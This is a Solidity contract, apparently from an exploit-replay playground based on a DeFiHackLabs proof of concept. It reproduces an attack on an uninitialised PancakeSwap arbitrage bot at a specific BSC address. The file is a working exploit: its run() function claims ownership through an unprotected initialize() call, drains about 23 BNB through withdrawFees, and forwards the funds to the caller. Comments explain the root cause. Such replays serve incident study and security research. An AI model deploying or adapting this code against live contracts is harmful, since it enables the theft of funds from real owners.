// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2025-02-unverified_d4f1).
// The DeFiHackLabs PoC (test/unverified_d4f1_exp.sol) runs the ENTIRE attack
// INLINE in the constructor of `AttackerC`, deployed via `new AttackerC()` from
// `testPoC()`. Because recordExploit.ts always deploys UNRECORDED and then
// records exactly one function call (a constructor itself can never be the
// recorded call), this is reproduced as a SYNTHETIC exploit: the constructor's
// three steps are moved verbatim into a callable `run()` entrypoint.
//
// Root cause (see unverified_d4f1_exp.md / sources/bytecode_facts.md): the
// unverified victim at 0xD4F1AFD0331255e848c119CA39143D41144f7Cb3 is a
// PancakeSwap V2/V3 arbitrage/swap-helper bot built on OpenZeppelin's
// upgradeable `Initializable` + `OwnableUpgradeable` base, holding 23.007 BNB
// of accumulated profit. It was deployed but NEVER initialized (on-chain
// `owner() == address(0)`, OZ `Initializable` slot == 0). Because OZ's
// `initializer` modifier only guarantees a one-shot call, not an
// access-controlled one, ANY address can call `initialize()` and become the
// owner. The attacker does exactly that, then calls the now-owner-gated
// `withdrawFees(address _to, uint256 _amount)` with `_to = address(0)`
// (resolved by the victim to `msg.sender`, i.e. the caller) to drain the
// entire native BNB balance to itself, then forwards it to `tx.origin`.
//
// Logic, constants, and the call sequence are copied verbatim from
// test/unverified_d4f1_exp.sol's `AttackerC` constructor (lines 40-56).
contract UnverifiedInitDrain {
    address internal constant VICTIM = 0xD4F1AFD0331255e848c119CA39143D41144f7Cb3;

    // Mirrors AttackerC's constructor (test/unverified_d4f1_exp.sol:41-56),
    // moved into a callable entrypoint so the recorder can capture it as the
    // single recorded call after an unrecorded deploy.
    function run() external {
        // call_1: claim ownership of the never-initialized victim.
        (bool s1, ) = VICTIM.call(abi.encodeWithSelector(bytes4(keccak256("initialize()"))));
        require(s1, "init failed");

        // call_2: now the owner, drain the victim's entire native BNB balance.
        // _to = address(0) is resolved by the victim as "send to msg.sender".
        (bool s2, ) = VICTIM.call(
            abi.encodeWithSelector(
                bytes4(keccak256("withdrawFees(address,uint256)")),
                address(0),
                uint256(23007026290916620075)
            )
        );
        require(s2, "withdrawFees failed");

        // call_3: forward the drained BNB to the attacker EOA.
        payable(tx.origin).transfer(23007026290916620075);
    }

    // receive to accept the victim's withdrawFees() payout.
    receive() external payable {}
}
